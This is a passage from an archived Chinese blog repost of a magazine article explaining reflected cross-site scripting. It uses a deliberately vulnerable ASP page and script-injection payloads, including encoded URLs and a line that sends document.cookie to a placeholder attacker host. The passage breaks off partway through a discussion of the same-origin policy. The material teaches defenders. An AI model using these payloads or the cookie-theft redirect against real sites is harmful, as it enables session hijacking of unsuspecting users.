href="/java/%E6%95%B0%E6%8D%AE%E5%BA%93/2011/06/09/e3-80-90-e8-bd-ac-e3-80-91hibernate-e7-9a-84-e4-b9-90-e8-a7-82-e9-94-81-e4-b8-8e-e6-82-b2-e8-a7-82-e9-94-81.html" data-flip="title">【转】Hibernate的乐观锁与悲观锁</a></p> </article> <article id="post-web/web%E5%89%8D%E7%AB%AF/2011/06/09/%e3%80%90%e8%bd%ac%e3%80%91%e8%b7%a8%e7%ab%99%e8%84%9a%e6%9c%acxss%e8%a4%9a%e8%af%9a%e4%ba%91" class="post mb6" role="article"> <header> <h1 class="post-title"> <a href="/web/web%E5%89%8D%E7%AB%AF/2011/06/09/e3-80-90-e8-bd-ac-e3-80-91-e8-b7-a8-e7-ab-99-e8-84-9a-e6-9c-acxss-e8-a4-9a-e8-af-9a-e4-ba-91.html" data-flip="title"> 【转】跨站脚本XSS–褚诚云 </a> </h1> <p class="post-date heading"> <time datetime="2011-06-09T17:54:42+08:00">09 Jun 2011</time> in <span>Web</span> / <span>Web前端</span> on <span>Xss</span> </p> <div class="hr" style="padding-bottom:0"></div> </header> </p> <h2 id="internal-source-marker_0.6994031774665248"><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 18pt; vertical-align: baseline; font-weight: bold; text-decoration: none">跨站脚本XSS–褚诚云</span></h2> <p><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">630 views,</span><a href="http://hackeye.com/post/category/security"><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"> </span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000099; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: underline">安全防护</span></a><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">, by Neeao.</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">《程序员》文章。申明。文章仅代表个人观点，与所在公司无任何联系。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 12pt; vertical-align: baseline; font-weight: normal; text-decoration: none">1.概述</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">跨站脚本</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Cross-Site Scripting</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">（</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">XSS</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">）是最为流行的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Web</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">安全漏洞之一。据统计，</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">2007</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">年，跨站脚本类的安全漏洞的数目已经远远超出传统类型的安全漏洞【</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">1</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">】。那么，什么是跨站脚本？它的危害性是什么？</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Web</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">开发人员如何在开发过程中避免这类的安全漏洞？就是我们这篇文章要讨论的内容。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 12pt; vertical-align: baseline; font-weight: normal; text-decoration: none">2.什么是跨站脚本</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 12pt; vertical-align: baseline; font-weight: normal; text-decoration: none">2.1 跨站脚本介绍</span> </p> <p><font color="#0000ff">[PS:这里讲怎样进行xss攻击讲的还是不太清楚，见</font><a href="http://kazge.com/archives/802.html">http://kazge.com/archives/802.html</a> 。] <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">跨站脚本，就是攻击者可以将恶意的脚本代码注入到用户浏览的其它网页上。它有好几种类型。其中最为普遍的类型称为反射类（</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Reflection</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">）的跨站脚本。让我们来看下面这个例子来具体说明</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">XSS</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的机理。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">以一个简单的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">ASP</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">网页举例。这个</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">ASP</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">网页的目的很简单：用户输入自身名字，</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">ASP</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">动态产生一个“</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">hello world</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">”的网页。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">testXSS.html</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;html&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;head&gt; &lt;title&gt;XSS Test Page&lt;/title&gt; &lt;/head&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;body&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;form action=”testXSS.asp” method=”GET”&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">XSS-test page. &lt;br&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Please enter your name:</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;input type=”text” name=”txtName” value=”&quot;&gt;&lt;/input&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;input type=”submit” value=”Hello”&gt;&lt;/input&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;/form&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;/body&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;/html&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">当用户浏览到这个网页时，就会显示：</span><img src="/assets/77pSDkeslwUjNKXVh38kFNQZIPWdFVJL_Us1fvimvKsAjvHkYxrJ4u6yu_CvKulWD5-UJhVMNp7yMvoHtk3qEj7e_lXvP6uYK0rkVH-JS99ohh5REw" width="489" height="180" /> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">输入用户的名字，例如</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">foo</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">。点击</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Hello</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">，就会产生以下</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">ASP</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">请求：</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">http://&lt;server-url&gt;/testXSS.asp?txtName=foo</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">下面是后台</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">ASP</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的代码，</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">testXSS.asp</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;html&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;head&gt; &lt;title&gt;XSS Test Result ASP page&lt;/title&gt; &lt;/head&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;body&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;%</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Response.Write(“Hello world! “)</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Response.Write(Request.QueryString(“txtname”))</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">%&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;/body&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;/html&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">动态生成的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">ASP</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">网页就是：</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">这个</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">ASP</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">应用很简单，看上去没有任何功能上的问题。但是，它确存在着一个非常典型的反射类的跨站脚本漏洞。下面我们来看看攻击者是如何利用的。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">在用户姓名栏中输入脚本信息：</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;script&gt;alert(“script injection\n”+document.cookie);&lt;/script&gt;&lt;body&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">发出的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">ASP</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的请求就是：</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">http://&lt;server-url&gt;/testXSS.asp?txtName=%3Cscript%3Ealert%28%22script+injection%5Cn%22%2Bdocument.cookie%29%3B%3C%2Fscript%3E</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">那么，动态生成的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">ASP </span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">网页中就包括了攻击者插入的脚本</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;html&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;head&gt; &lt;title&gt;XSS Test Result ASP page&lt;/title&gt; &lt;/head&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;body&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Hello world! &lt;script&gt;alert(“script injection\n”+document.cookie);&lt;/script&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;/body&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;/html&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">用户的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Browser</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">就会弹出以下窗口：</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">跨站脚本除了</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Reflection</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">类型外，还有其它几种类型，例如基于</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">DOM</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的跨站脚本和存储型的跨站脚本，限於篇幅，这里就不详细讨论了。有兴趣的读者可以参见【</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">1</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">】。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: verdana; color: #000000; font-size: 12pt; vertical-align: baseline; font-weight: normal; text-decoration: none">3. </span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 12pt; vertical-align: baseline; font-weight: normal; text-decoration: none">跨站脚本的危害性</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">看了上面这个</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">XSS</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的例子，那么</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">XSS</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的造成的危害在哪里？下面我们通过一些问答来阐述</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">XSS</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的危害性。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">提问</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">1</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">：这不是攻击者自己键入的脚本在自己的浏览环境中执行吗？</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">其实不然，</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">XSS</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的攻击手段是诱使用户点击</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">email</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">或网页中的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">URL</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">链接，例如下面这个</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">URL</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">链接：</span> <br /><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #0000ff; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: underline">http://&lt;server-url&gt;/testXSS.asp?txtName=%3Cscript%3Ealert%28%22script+injection%5Cn%22%2Bdocument.cookie%29%3B%3C%2Fscript%3E</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">这样，当一个普通用户点击的这个链接的时候，攻击者的脚本就可以在</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">这个被攻击用户</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的浏览环境中执行了。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">提问</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">2</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">：上面这个链接也太可疑了。脚本直接显示在</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">URL</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">中，一般的用户可能是不会点击的吧？</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">没错。但是在真正的攻击中，以上的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">script</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">会以不同的形式编码，例如下面这种链接：</span> <br /><a href="http://chchuw2k3/xss/testXSS.asp?txtName=%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%73%63%72%69%70%74%20%69%6E%6A%65%63%74%69%6F%6E%5C%6E%22%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29%3B%3C%2F%73%63%72%69%70%74%3E%20"><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #0000ff; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: underline">http://</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000099; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: underline"> </span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #0000ff; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: underline">&lt;server-url&gt;/testXSS.asp?txtName=%22%3E%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%22%73%63%72%69%70%74%20%69%6E%6A%65%63%74%69%6F%6E%5C%6E%22%2B%64%6F%63%75%6D%65%6E%74%2E%63%6F%6F%6B%69%65%29%3B%3C%2F%73%63%72%69%70%74%3E</span></a> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">对于这种链接，许多普通用户可能就直接点击了。尤其是如果</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Server-url</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">是自己经常访问的网站的话</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none"> </span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">。</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">提问</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">3</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">：只是显示了</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">document.cookie</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">有什么危害？</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">如果只是显示</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">cookies</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">的话，当然不会造成任何影响。但是，上面这个例子只是一个示范。在真正的攻击中，往往会将用户的</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">cookies</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">直接发送到攻击者控制的网站。例如使用以下脚本：</span> <br /><span style="background-color: transparent; font-style: normal; font-family: courier new; color: #000000; font-size: 10pt; vertical-align: baseline; font-weight: normal; text-decoration: none">&lt;script&gt;document.location=’http://&lt;badguy-url&gt;/cgi-bin/cookie.cgi? ‘%20+document.cookie&lt;/script&gt;</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">提问</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">4</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">：窃取了</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">document.cookie</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: bold; text-decoration: none">又有什么危害？</span> <br /><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">这就要从浏览器安全的基本原则：同源原则</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">SOP</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">（</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">Same-origin policy</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">）讲起。简要的说，</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">SOP</span><span style="background-color: transparent; font-style: normal; font-family: arial; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: normal; text-decoration: none">意味着一个域的文档或脚本，在未经用户批准的情况下，不能获取或修改另一个域的文档的属性。为什么需要</span><span style="background-color: transparent; font-style: normal; font-family: calibri; color: #000000; font-size: 11pt; vertical-align: baseline; font-weight: 